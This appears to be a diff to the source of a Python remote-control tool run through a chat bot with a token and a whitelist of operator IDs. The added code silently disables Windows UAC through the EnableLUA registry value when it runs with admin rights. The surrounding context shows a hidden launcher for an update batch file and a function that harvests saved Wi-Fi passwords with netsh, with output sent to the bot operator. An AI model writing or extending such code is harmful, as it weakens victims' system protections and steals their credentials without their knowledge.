@@ -14,30 +14,43 @@ import json as jsn
 with open("config.json", 'r', encoding='utf-8') as f:
     data = jsn.load(f)
 
+if ctypes.windll.shell32.IsUserAnAdmin():
+    command1 = 'reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA'
+    subprocess.run(['cmd.exe', '/c', command1], shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    command2 = 'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
+    subprocess.run(['cmd.exe', '/c', command2], shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+
 
 class Data:
     id = data["white_list"]
     update = data["update"]
     name = data["name_pc"]
     token = data["bot_token"]
+    uis = data["uis"]
 
 class Logger_Bot:
     def __init__(self) -> None:
-        self.path = '\\logs\\'
+        self.path = 'logs\\'
+        day = 3
+        current, dirs, files = os.walk(self.path).__next__()
+        if len(files) >= day:
+            files = sorted(files)[:-3]
+            for i in files:
+                os.remove(self.path+i)
 
     def __save_log(self, text):
-        path_log = self.path + 'log_' + datetime.now().strftime('%Y-%m-%d').replace(' ','_').replace(':','-')
+        path_log = self.path + 'log_' + datetime.now().strftime('%Y-%m-%d').replace(' ','_').replace(':','-')+".txt"
         arg = 'w'
         if os.path.exists(path_log):
-            arg = 'r+'
+            arg = 'a'
         with open(path_log, arg) as new_log:
-            new_log.write(text)
+            new_log.write(text+"\n")
 
     def log(self, name_func, e_text):
         time_e = datetime.now().strftime('%H:%M:%S').replace(' ','_').replace(':','-')
         text = f"[{time_e}] {name_func}: {e_text}."
         self.__save_log(text)
-        pass
+
 
 
 if not os.path.isdir('media'):
@@ -385,8 +398,8 @@ sh.Run "{pth}\\upd.bat", 0'''
             logger.log(self.browser.__name__,e)
             bot.send_message(self.id, f'🖥❌ \n{e}')
     def extract_wifi_passwords(self):
-        otv = ''
         try:
+            otv = ''
             profiles_data = subprocess.check_output('netsh wlan show profiles').decode('utf-8').split('\n')
             profiles = [i.split(':')[1].strip() for i in profiles_data if 'All User Profile' in i]
             
